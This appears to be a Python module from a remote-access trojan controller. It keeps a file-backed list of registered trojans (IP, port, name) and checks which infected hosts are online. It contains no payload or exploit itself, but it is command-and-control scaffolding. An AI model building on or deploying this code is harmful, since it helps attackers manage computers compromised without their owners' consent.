__author__ = 'Jonas'
from util import path
from trojanconnection import TrojanConnection
from JTShell.lib.JTLib.JTOS.JTCombinedOs import createfile
import os


class TrojanList:
    """
    An object containing encapsulating the two list of already registered trojans, which are saved inside of a given
    text file and then loaded into the list once the necessary method has been called and the list of available trojans,
    whose host computers are online at the moment their availability is checked by the corresponding method
    """
    def __init__(self):
        self.available = []
        self.registered = []

    def load_registered_trojans(self, filename):
        """
        loads the already registered trojans form a given text file into the internal list of the object
        :param filename: (string) the name of the text file in which the trojan info is saved
        :return: (void)
        """
        if "\\" in filename:
            filepath = filename
        else:
            filepath = path()+"\\"+filename+".txt"
        # opens the file of the filename passed
        with open(filepath, "r") as file:
            # now reads the contents of the file, and converts them into a list consisting of lists each containing the
            # relevant information for the represented trojan
            content = file.read()
            # first dividing it by columns and then by semicolons
            temp_list = []
            for line in content.split("\n"):
                if ";" in line:
                    temp_list.append(line.split(";"))
            # then going through the finished list and build trojan connection objects with the data from the file
            for sublist in temp_list:
                self.registered.append(TrojanConnection(sublist[0], sublist[1], sublist[2]))

    def save_registered_trojans(self, filename):
        """
        saves the already registered trojans from the internal list into a given textfile
        :param filename: (string) the name of the text file in which the trojan info is saved
        :return: (void)
        """
        if "\\" in filename:
            filepath = filename
        else:
            filepath = path()+"\\"+filename+".txt"
        # opens the file of the filename passed, in case it exists
        if not os.path.exists(filepath):
            createfile(filepath)
        with open(filepath, "w") as file:
            # itering through the list of registered trojans and writing the information into the lines, separated
            # by semicolons
            for trojan in self.registered:
                file.write(trojan.ip + ";")
                file.write(trojan.port + ";")
                file.write(trojan.name)
                file.write("\n")

    def register(self, ip, port, name):
        """
        registers a trojan of the given name and ip in the temporary list of the object and then later
        permanently saves it in the file
        :param name: (string) the name of the trojan to be registered in the file
        :param ip: (string) the ip of the trojan to be registered
        :param port: (int) the port at which the ne trojan will be listening
        :return: (void)
        """
        self.registered.append(TrojanConnection(ip, port, name))

    def load_available_trojans(self):
        """
        loads the list of available trojans by going through the list of registered trojans, calling the "check"
        method on each of them, in case they are active, the trojan will be added to the available list
        :return: (void)
        """
        # goes through the list of registered trojans calls the check method to know whether the trojan is available
        for trojan in self.registered:
            if trojan.check():
                self.available.append(trojan)

    def check_availability(self):
        """
        a method to essentially update the list of available trojans, by calling the check method on all of them and
        in case the method returns False, removes those trojans from the list
        :return: (void)
        """
        # goes through the list of available trojans calling the check method to determine whether they are still active
        for trojan in self.available:
            if not trojan.ping():
                self.available.remove(trojan)
